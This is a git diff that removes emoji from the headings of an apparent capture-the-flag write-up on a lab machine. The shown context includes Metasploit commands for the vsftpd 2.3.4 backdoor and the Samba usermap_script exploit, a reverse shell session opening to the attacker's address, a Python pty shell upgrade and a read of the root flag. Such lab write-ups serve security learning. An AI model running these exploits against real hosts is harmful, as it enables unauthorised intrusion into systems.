@@ -38,7 +38,7 @@ Successfully connected and browsed the `tmp` share.
 
 ---
 
-## 💥 Exploitation
+## Exploitation
 
 ### FTP – Vsftpd 2.3.4 (CVE-2011-2523)
 - **Exploit Used:** `exploit/unix/ftp/vsftpd_234_backdoor`
@@ -57,7 +57,7 @@ msf6 > use exploit/multi/samba/usermap_script
 [*] Command shell session 1 opened (10.10.16.5:4444 -> 10.10.10.3:43580)
 ```
 
-## ⚙️ Privilege Escalation
+## Privilege Escalation
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 id
@@ -75,12 +75,12 @@ cat /root/root.txt
 
 ---
 
-## 🛠️ Tools Used
+## Tools Used
 - `nmap`, `smbmap`, `smbclient`, `metasploit`, `searchsploit`, `nc`, `netstat`
 
 ---
 
-## 🧠 Key Takeaways
+## Key Takeaways
 - Exploiting outdated Samba services is still viable on legacy boxes.
 - Port filtering can block shell return paths even if a vuln exists (FTP port 6200).
 - Always enumerate SMB shares even without creds — `smbclient` often provides an initial foothold.
